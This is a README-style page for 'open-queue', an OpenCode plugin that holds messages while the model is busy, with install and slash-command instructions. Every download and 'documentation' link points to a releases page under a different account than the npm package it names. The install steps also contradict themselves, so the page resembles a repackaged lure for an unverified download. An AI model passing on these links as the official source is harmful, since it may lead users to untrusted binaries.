---
layout: "default"
title: "🚀 open-queue - Queue Messages Easily for OpenCode"
description: "🎤 Queue messages while OpenCode processes, ensuring smooth interactions and preventing context confusion with automatic message handling."
---
# 🚀 open-queue - Queue Messages Easily for OpenCode

[![Download open-queue](https://img.shields.io/badge/Download%20open--queue-blue?style=for-the-badge)](https://github.com/yusufyusufyuf/open-queue/releases)

## 📜 Description

![queue-power.svg](assets/queue-power.svg)

Open Queue helps you manage your messages while OpenCode is working. Instead of interrupting the model, your messages will wait in line. They will send automatically once the model is ready.

## 💡 Why Use Open Queue?

When using OpenCode, sending messages at the wrong time can cause confusion. Here’s how Open Queue can help:

- **Without Open Queue**: Your message interrupts the current operation, which can cause context confusion. 
- **With Open Queue**: Your message gets queued and sends automatically when OpenCode is ready to process it.

## 📥 Download & Install

To get started, visit the following link to download the software:

[Download open-queue](https://github.com/yusufyusufyuf/open-queue/releases)

Once you've downloaded the file, follow these steps to install it:

1. Open a terminal on your computer.
2. Type the following command to install Open Queue using Bun:
   ```bash
   bun x @0xsero/open-queue
   ```
   Alternatively, you can use NPM by typing:
   ```bash
   npx @0xsero/open-queue
   ```

This will add Open Queue to your configuration file (`opencode.json`) and set up the command you need.

## 🎮 Usage

Open Queue is easy to use. Here are the commands you can use:

1. **Hold Messages**: 
   ```
   /queue hold
   ```
   This command will queue your messages until OpenCode is finished.

2. **Immediate Sending**:
   ```
   /queue immediate
   ```
   Use this to send any queued messages right away.

3. **Check Queue Status**:
   ```
   /queue status
   ```
   This lets you see the current mode of the queue.

You can also instruct OpenCode directly by saying: “Turn on message queueing”.

## ⚙️ Environment Variables

You can run Open Queue with specific settings using environment variables. Refer to the Open Queue documentation for more details on which settings are available.

## 🛠️ System Requirements

For the best experience with Open Queue, ensure you meet these system requirements:

- A modern operating system, such as Windows, macOS, or Linux.
- Basic access to a terminal or command line interface.
- OpenCode must be installed and configured prior to using Open Queue.

## 🌟 Features

Open Queue offers several features to enhance your messaging experience:

- **Automatic Queuing**: Messages sent while the model is busy will automatically queue up without interruptions.
- **Real-Time Updates**: Get updates on the status of your messages.
- **User-Friendly Commands**: Simple commands make it easy to manage your queue.

## ℹ️ Additional Information

For more detailed usage tips, troubleshooting, and information about updates, visit the official Open Queue [documentation](https://github.com/yusufyusufyuf/open-queue/releases).

## 📞 Support

If you have any questions or need support, please check the issues page in the repository. You can report problems or ask for help there.

For more community support, consider joining OpenCode forums or discussion groups where users share experiences.

## 🔗 Links

- [Download open-queue](https://github.com/yusufyusufyuf/open-queue/releases)
- [Open Queue Documentation](https://github.com/yusufyusufyuf/open-queue/releases)

By downloading Open Queue, you enhance your OpenCode experience and streamline your message management effectively.